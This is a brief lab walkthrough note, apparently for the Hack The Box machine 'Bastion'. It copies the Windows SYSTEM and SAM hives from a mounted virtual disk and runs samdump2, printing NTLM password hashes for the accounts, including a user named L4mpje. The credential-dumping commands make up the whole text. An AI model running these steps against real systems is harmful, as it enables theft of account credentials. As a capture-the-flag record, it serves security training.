# find data contain ntlm

    root@kali:~/Desktop/HTB/boxes/bastion# cp /mnt/vhd/Windows/System32/config/SYSTEM .
    root@kali:~/Desktop/HTB/boxes/bastion# cp /mnt/vhd/Windows/System32/config/SAM .

# samdump2

    root@kali:~/Desktop/HTB/boxes/bastion# samdump2 ./SYSTEM ./SAM 
    *disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::

hashnya di: 26112010952d963c8dc4217daec986d9